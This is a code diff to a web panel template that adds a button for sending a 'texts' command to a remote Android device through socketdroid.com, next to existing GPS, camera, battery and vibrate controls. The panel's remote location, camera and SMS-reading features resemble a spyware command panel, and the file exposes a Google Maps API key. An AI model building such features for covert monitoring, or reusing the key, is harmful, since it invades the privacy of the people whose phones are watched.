@@ -31,6 +31,7 @@
         <button data-id="{{$device->id}}" class="btn btn-sm btn-default action-vibrate" id="vibrate"><i class="fa fa-mobile" aria-hidden="true"></i></button>
         <button data-id="{{$device->id}}" class="btn btn-sm btn-default action-battery" id="battery"><i class="fa fa-battery-full" aria-hidden="true"></i></button>
         <button data-id="{{$device->id}}" class="btn btn-sm btn-default action-camera" id="camera"><i class="fa fa-camera-retro" aria-hidden="true"></i></button>
+        <button data-id="{{$device->id}}" class="btn btn-sm btn-default action-texts" id="texts"><i class="fa fa-envelope" aria-hidden="true"></i></button>
       </td>
   </tr>
       @endforeach
@@ -76,6 +77,7 @@ var getGps = document.getElementsByClassName("action-get-gps");
 var vibrate = document.getElementsByClassName("action-vibrate");
 var battery = document.getElementsByClassName("action-battery");
 var images = document.getElementsByClassName("action-camera");
+var texts = document.getElementsByClassName("action-texts");
 
 
 
@@ -125,6 +127,15 @@ for (var i = 0; i < vibrate.length; i++) {
       }, false);
 });
 }
+for (var i = 0; i < texts.length; i++) {
+  console.log(vibrate[i]);
+    texts[i].addEventListener('click', function(){
+      $.get("https://socketdroid.com/command/texts/" + $(this).data('id'), function(data, status){
+
+      }, false);
+});
+}
+
 function initMap(lat,long) {
         var uluru = {lat: -25.363, lng: 131.044};
         var map = new google.maps.Map(document.getElementById('map'), {
@@ -149,7 +160,7 @@ function initMap(lat,long) {
           });
 
       }
-      
+
 </script>
 <script async defer
     src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBCDNt1biVyfA8h-eCZyZ69CKS6NNBCeEQ&callback=initMap">
